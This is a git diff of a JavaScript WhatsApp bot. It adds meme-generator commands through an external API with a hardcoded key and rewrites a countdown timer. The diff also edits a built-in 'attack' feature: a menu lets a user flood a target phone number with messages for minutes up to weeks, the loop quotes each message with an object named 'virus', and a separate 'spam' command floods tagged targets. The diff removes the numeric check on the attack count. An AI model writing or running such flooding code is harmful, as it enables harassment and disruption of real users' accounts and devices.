@@ -2339,37 +2339,60 @@ satria.relayMessage(m.chat, prep.message, { messageId: prep.key.id })
             break
             case 'tweetmaker':{
             	if(!text) throw `Example : ${command} username|text`
+            m.reply(mess.wait)
 let tes1 = text.split("|")[0]
 let tes2 = text.split("|")[1] 
 let anjay = `https://zenzapis.xyz/creator/maketweet?text2=${tes1}&text=${tes2}&apikey=satganzdevs`
-            let buttons = [
-                    {buttonId: `menu`, buttonText: {displayText: 'Menu '}, type: 1}
-                ]
-                let buttonMessage = {
-                    image: { url: anjay },
-                    caption: `by satria`,
-                    footer: satria.user.name,
-                    buttons: buttons,
-                    headerType: 4
-                }
-                satria.sendMessage(m.chat, buttonMessage, { quoted: fgclink })
+            satria.sendMessage(m.chat, { image: { url: anjay }, caption: `${command}` }, { quoted: fgclink })
             }
             break
             case 'kannagen':{
             	if(!text) throw `Example : ${command} text`
-let tes1 = text.split("|")[0]
+let tes1 = args.join(" ")
 let anjay = `https://zenzapis.xyz/creator/kannagen?text=${tes1}&apikey=satganzdevs`
-            let buttons = [
-                    {buttonId: `menu`, buttonText: {displayText: 'Menu '}, type: 1}
-                ]
-                let buttonMessage = {
-                    image: { url: anjay },
-                    caption: `by satria`,
-                    footer: satria.user.name,
-                    buttons: buttons,
-                    headerType: 4
-                }
-                satria.sendMessage(m.chat, buttonMessage, { quoted: fgclink })
+                satria.sendMessage(m.chat, { image: { url: anjay }, caption: `${command}` }, { quoted: fgclink })
+            }
+            break
+            case 'pooh':{
+            	if(!text) throw `Example : ${command} text1|text2`
+            m.reply(mess.wait)
+let tes1 = text.split("|")[0]
+let tes2 = text.split("|")[1]
+let anjay = `https://zenzapis.xyz/creator/poohmeme?text=${tes1}&text2=${tes2}&apikey=satganzdevs`
+                satria.sendMessage(m.chat, { image: { url: anjay }, caption: `${command}` }, { quoted: fgclink })
+            }
+            break
+            case 'drake':{
+            	if(!text) throw `Example : ${command} text1|text2`
+            m.reply(mess.wait)
+let tes1 = text.split("|")[0]
+let tes2 = text.split("|")[1]
+let anjay = `https://zenzapis.xyz/creator/drakememe?text=${tes1}&text2=${tes2}&apikey=satganzdevs`
+                satria.sendMessage(m.chat, { image: { url: anjay }, caption: `${command}` }, { quoted: fgclink })
+            }
+            break
+            case 'tahta':{
+            	if(!text) throw `Example : ${command} text`
+            m.reply(mess.wait)
+let tes1 = args.join(" ")
+let anjay = `https://zenzapis.xyz/creator/hartatahta?text=${tes1}&apikey=satganzdevs`
+                satria.sendMessage(m.chat, { image: { url: anjay }, caption: `${command}` }, { quoted: fgclink })
+            }
+            break
+            case 'sadcat':{
+            	if(!text) throw `Example : ${command} text`
+            m.reply(mess.wait)
+let tes1 = args.join(" ")
+let anjay = `https://zenzapis.xyz/creator/sadcat?text=${tes1}&apikey=satganzdevs`
+                satria.sendMessage(m.chat, { image: { url: anjay }, caption: `${command}` }, { quoted: fgclink })
+            }
+            break
+            case 'changemymind': case 'cmm':{
+            	if(!text) throw `Example : ${command} text`
+            m.reply(mess.wait)
+let tes1 = args.join(" ")
+let anjay = `https://zenzapis.xyz/creator/changemymind?text=${tes1}&apikey=satganzdevs`
+                satria.sendMessage(m.chat, { image: { url: anjay }, caption: `${command}` }, { quoted: fgclink })
             }
             break
             case 'quotesanime': case 'quoteanime': {
@@ -2807,6 +2830,7 @@ let anjay = `https://zenzapis.xyz/creator/kannagen?text=${tes1}&apikey=satganzde
             break
 	        case 'tiktok': case 'tiktoknowm': {
 	if (!text) throw 'Masukkan Query Link!'
+	m.reply(mess.wait)
 	let anu = await fetchJson(api('zenz', '/downloader/musically', { url: text }, 'apikey'))
 	 let buttons = [
                     {buttonId: `tiktoknowm ${text}`, buttonText: {displayText: '► No Watermark'}, type: 1},
@@ -3997,6 +4021,9 @@ Date : ${salam}
 ├ ${prefix}jawaquote
 ├ ${prefix}kanyequote
 ├ ${prefix}kannagen
+├ ${prefix}pooh
+├ ${prefix}tahta
+├ ${prefix}sadcat
 ├ ${prefix}tweetmaker
 ├ ${prefix}asupan
 ╰❒
@@ -4117,13 +4144,48 @@ let butt =[{ buttonId: 'u', buttonText: { displayText: 'Alhamdulillah' }, type: 
 }
 reply('Success')
 break
-            case 'hitungmundur': case 'stopwatch': case 'sw':{
-            	waktu = args.join(" ")
-            m.reply(`*${command}* Dimulai`)
-            await sleep(`${waktu}000`)
-            m.reply(`*${command}* Berakhir`)
-            }
-            break
+            case 'hitungmundur': case 'countdown': case 'cd':{
+            if (text.split("|")[1] === "minute") {
+            	m.reply(`Countdown Time Has Start`)
+                	let time = text.split("|")[0]+"00000"
+                	await sleep(time)
+                satria.sendMessage(m.chat, {text: `Countdown Time Has Ended `, contextInfo:{  externalAdReply: { showAdAttribution: true,
+mediaType:  1,
+mediaUrl: 'https://wa.me/6281316701742',
+title: '「 ❔ 」',
+body: ucapanWaktu,
+sourceUrl: `https://${global.web}`, thumbnail: thumb
+  }
+ }}, { quoted: m })
+                } else if (text.split("|")[1] === "second") {
+                	m.reply(`Countdown Time Has Start`)
+                   let time = text.split("|")[0]+"000"
+                	await sleep(time)
+                satria.sendMessage(m.chat, {text: `Countdown Time Has Ended `, contextInfo:{  externalAdReply: { showAdAttribution: true,
+mediaType:  1,
+mediaUrl: 'https://wa.me/6281316701742',
+title: '「 ❔ 」',
+body: ucapanWaktu,
+sourceUrl: `https://${global.web}`, thumbnail: thumb
+  }
+ }}, { quoted: m })
+                } else if (text.split("|")[1] === "hours") {
+                	m.reply(`Countdown Time Has Start`)
+                	let time = text.split("|")[0]+"0000000"
+                	await sleep(time)
+                satria.sendMessage(m.chat, {text: `Countdown Time Has Ended `, contextInfo:{  externalAdReply: { showAdAttribution: true,
+mediaType:  1,
+mediaUrl: 'https://wa.me/6281316701742',
+title: '「 ❔ 」',
+body: ucapanWaktu,
+sourceUrl: `https://${global.web}`, thumbnail: thumb
+  }
+ }}, { quoted: m })
+                } else {
+                 m.reply(`usage example: \n\n countdown 6|second`)
+                }
+             }
+             break
            case 'spam':{
 if (!text) throw m.reply(`Examples of use : ${command} *>Message<*|>@Tag<|*>Amount<*`) 
 let spar = text.split("|")[0]
@@ -4147,9 +4209,19 @@ case 'p':{
 break
 case 'carbon':{
 	if (!text) throw m.reply('Input text')
-	let res = await fetchJson(`https://api-rull.herokuapp.com/api/cmd?code=${q}`)
-	satria.sendMessage(m.chat, { image: { url: res.url }}, { quoted: m })
-	}
+	m.reply(mess.wait)
+	let buttons = [
+                    {buttonId: `.igy`, buttonText: {displayText: `Tq Sayang`}, type: 1}
+                ]
+                let buttonMessage = {
+                    image: { url: `https://api-rull.herokuapp.com/api/cmd?code=${q}` },
+                    caption: `Nih Coy`,
+                    footer: satria.user.name,
+                    buttons: buttons,
+                    headerType: 4
+                }
+                satria.sendMessage(m.chat, buttonMessage, { quoted: fgclink })
+            }
 	break
 	 case 'sewabot': case 'rent': case 'sewa': case 'donate': case 'donation': case 'donasi': case 'donet':{
 		let btn = [{
@@ -4186,7 +4258,7 @@ let isOwn = isnoown.test(m.text)
  {
  let sections = [
                 {
-                title: "MINUTES",
+                title: "MINUTE SELECTION",
                 rows: [
                 {title: "1 Minute", rowId: `.atk ${noget}|1`, description: `Attack ${noget} During 1 Minute `},
                 {title: "2 Minute", rowId: `.atk ${noget}|2`, description: `Attack ${noget} During 2 Minute`},
@@ -4196,7 +4268,7 @@ let isOwn = isnoown.test(m.text)
                 ]
                 },
                 {
-                title: "HOURS",
+                title: "CLOCK SELECTION",
                 rows: [
                 {title: "1 Hours", rowId: `.atk ${noget}|60`, description: `Attack ${noget} During 1 Hours `},
                 {title: "2 Hours", rowId: `.atk ${noget}|120`, description: `Attack ${noget} During 2 Hours `},
@@ -4206,7 +4278,7 @@ let isOwn = isnoown.test(m.text)
                 ]
                 },
                 {
-                title: "DAY",
+                title: "DAILY SELECTION",
                 rows: [
                 {title: "1 Day", rowId: `.atk ${noget}|1440`, description: `Attack ${noget} During 1 Day `},
                 {title: "2 Day", rowId: `.atk ${noget}|2880`, description: `Attack ${noget} During 2 Day `},
@@ -4216,7 +4288,7 @@ let isOwn = isnoown.test(m.text)
                 ]
                 },
                 {
-                title: "WEEK",
+                title: "WEEKLY SELECTION",
                 rows: [
                 {title: "1 Week", rowId: `.atk ${noget}|10080`, description: `Attack ${noget} During 1 Week `},
                 {title: "2 Week", rowId: `.atk ${noget}|20160`, description: `Attack ${noget} During 2 Week `},
@@ -4239,7 +4311,6 @@ let isLinkThisGc = new RegExp(satgnz, 'i')
 let isgclink = isLinkThisGc.test(m.text)
  if (isgclink) return m.reply(`You Can't Attack My Owner`)
 if (!terern) throw m.reply(`Examples of use : ${command} *>Target<*|*>Amount<*`)
-if (isNaN(terern)) throw m.reply(`Must be a number `)
 for (let i = 0; i < terern; i++){
 satria.sendMessage(`${spar}@s.whatsapp.net`, { text: `p`, contextInfo:{"externalAdReply": {"title": ` hehe`,"body": ` hehe`, "previewType": "PHOTO","thumbnailUrl": `https://wa.me/6281316701742`,"thumbnail": thumb,"sourceUrl": "hehe"}}}, { quoted: virus})
 }
@@ -4264,7 +4335,7 @@ mediaType:  1,
 mediaUrl: 'https://wa.me/6281316701742',
 title: '「 ❔ 」',
 body: ucapanWaktu,
-sourceUrl: 'http://github.com/SatzzBotzz', thumbnail: thumb
+sourceUrl: `https://${global.web}`, thumbnail: thumb
   }
  }}, { quoted: m })
             }
